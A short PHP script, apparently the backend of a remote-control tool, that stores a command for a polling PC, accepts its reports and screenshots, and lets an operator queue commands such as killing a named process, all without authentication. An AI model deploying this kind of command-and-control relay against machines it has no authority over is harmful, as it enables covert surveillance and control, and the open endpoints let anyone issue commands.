// Koyeb работает в контейнере, пишем файлы в локальную директорию
$cmdFile = __DIR__ . '/command.txt';
$logFile = __DIR__ . '/log.txt';
$screenFile = __DIR__ . '/screenshot.jpg';

if (isset($_GET['get_cmd'])) {
    echo file_exists($cmdFile) ? file_get_contents($cmdFile) : "none";
    exit;
}
if (isset($_GET['clear_cmd'])) {
    file_put_contents($cmdFile, 'none');
    echo "ok";
    exit;
}
if (isset($_POST['report'])) {
    file_put_contents($logFile, $_POST['report']);
    echo "ok";
    exit;
}
if (isset($_FILES['screen'])) {
    move_uploaded_file($_FILES['screen']['tmp_name'], $screenFile);
    echo "ok";
    exit;
}
if (isset($_POST['set_cmd'])) {
    $cmd = $_POST['set_cmd'];
    if ($cmd == 'delete' && !empty($_POST['proc_name'])) {
        $cmd .= ' ' . trim($_POST['proc_name']);
    }
    file_put_contents($cmdFile, $cmd);
    header("Location: index.php");
    exit;
}
$currentCmd = file_exists($cmdFile) ? file_get_contents($cmdFile) : 'none';
$currentLog = file_exists($logFile) ? file_get_contents($logFile) : 'Нет данных от ПК';
